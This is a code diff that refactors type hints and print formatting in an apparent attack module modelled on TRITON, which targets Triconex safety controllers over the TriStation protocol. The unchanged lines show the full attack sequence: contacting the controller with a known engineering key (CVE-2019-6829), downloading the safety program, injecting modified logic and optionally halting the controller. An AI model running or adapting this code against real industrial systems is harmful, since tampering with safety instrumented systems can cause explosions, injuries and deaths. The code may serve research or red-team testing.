@@ -26,7 +26,6 @@ References:
 import socket
 import struct
 import time
-from typing import Optional, Tuple
 
 # TriStation protocol constants (from Dragos/Mandiant reverse engineering)
 _TRISTATION_PORT = 1502
@@ -50,18 +49,18 @@ def _build_packet(fc: int, payload: bytes = b"", seq: int = 1) -> bytes:
     return header + body + struct.pack(">H", checksum)
 
 
-def _send_recv(sock: socket.socket, packet: bytes, timeout: float = 3.0) -> Optional[bytes]:
+def _send_recv(sock: socket.socket, packet: bytes, timeout: float = 3.0) -> bytes | None:
     """Send UDP packet and wait for response."""
     sock.sendto(packet, sock.getpeername())
     sock.settimeout(timeout)
     try:
         data, _ = sock.recvfrom(4096)
         return data
-    except socket.timeout:
+    except TimeoutError:
         return None
 
 
-def _parse_response(data: bytes) -> Tuple[int, bytes]:
+def _parse_response(data: bytes) -> tuple[int, bytes]:
     """Parse TriStation response, return (function_code, payload)."""
     if len(data) < 4:
         return -1, b""
@@ -96,16 +95,16 @@ def run(target: str, options: dict) -> bool:
     inject_nop = bool(options.get("inject_nop", True))
     do_halt = bool(options.get("halt", False))
 
-    print("[*] TRITON Native -- target {}:{}".format(target, port))
-    print("[*] Engineering key: {} (CVE-2019-6829)".format(_ENGINEERING_KEY.hex()))
-    print("[!] inject_nop={} halt={}".format(inject_nop, do_halt))
+    print(f"[*] TRITON Native -- target {target}:{port}")
+    print(f"[*] Engineering key: {_ENGINEERING_KEY.hex()} (CVE-2019-6829)")
+    print(f"[!] inject_nop={inject_nop} halt={do_halt}")
     print()
 
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.connect((target, port))
     except Exception as exc:
-        print("[-] Cannot create UDP socket: {}".format(exc))
+        print(f"[-] Cannot create UDP socket: {exc}")
         return False
 
     try:
@@ -117,10 +116,10 @@ def run(target: str, options: dict) -> bool:
             print("[-] No response to READ_PROGRAM_INFO -- controller unreachable or key rejected")
             return False
         fc, data = _parse_response(resp)
-        print("[+] FC 0x{:02X} response received -- controller present".format(fc))
+        print(f"[+] FC 0x{fc:02X} response received -- controller present")
         if len(data) >= 2:
             prog_count = struct.unpack(">H", data[:2])[0]
-            print("[+] Program slots: {}".format(prog_count))
+            print(f"[+] Program slots: {prog_count}")
 
         # Step 2: READ_PROGRAM_SIS -- download current safety logic
         print("[*] Step 2: READ_PROGRAM_SIS (FC 0x1D) -- downloading current SIS program...")
@@ -131,7 +130,7 @@ def run(target: str, options: dict) -> bool:
             print("[-] No response to READ_PROGRAM_SIS")
             return False
         fc2, sis_prog = _parse_response(resp)
-        print("[+] FC 0x{:02X} -- SIS program downloaded: {} bytes".format(fc2, len(sis_prog)))
+        print(f"[+] FC 0x{fc2:02X} -- SIS program downloaded: {len(sis_prog)} bytes")
 
         # Step 3: WRITE_PROGRAM_SIS -- inject modified program
         print("[*] Step 3: WRITE_PROGRAM_SIS (FC 0x20) -- injecting modified logic...")
@@ -156,7 +155,7 @@ def run(target: str, options: dict) -> bool:
         if fc3 == _FC_WRITE_PROGRAM_SIS:
             print("[+] WRITE acknowledged -- modified logic accepted by controller")
         else:
-            print("[!] Unexpected response FC 0x{:02X} to WRITE".format(fc3))
+            print(f"[!] Unexpected response FC 0x{fc3:02X} to WRITE")
 
         # Step 4: HALT (optional -- very destructive, disabled by default)
         if do_halt:
@@ -169,7 +168,7 @@ def run(target: str, options: dict) -> bool:
             if fc4 == _FC_HALT_SIS:
                 print("[+] HALT acknowledged -- controller stopped")
             else:
-                print("[!] HALT response: FC 0x{:02X}".format(fc4))
+                print(f"[!] HALT response: FC 0x{fc4:02X}")
         else:
             print("[i] Step 4: HALT_SIS skipped (halt=False, safer mode)")
 
@@ -179,7 +178,7 @@ def run(target: str, options: dict) -> bool:
         return True
 
     except Exception as exc:
-        print("[-] Error during TRITON execution: {}".format(exc))
+        print(f"[-] Error during TRITON execution: {exc}")
         return False
     finally:
         sock.close()
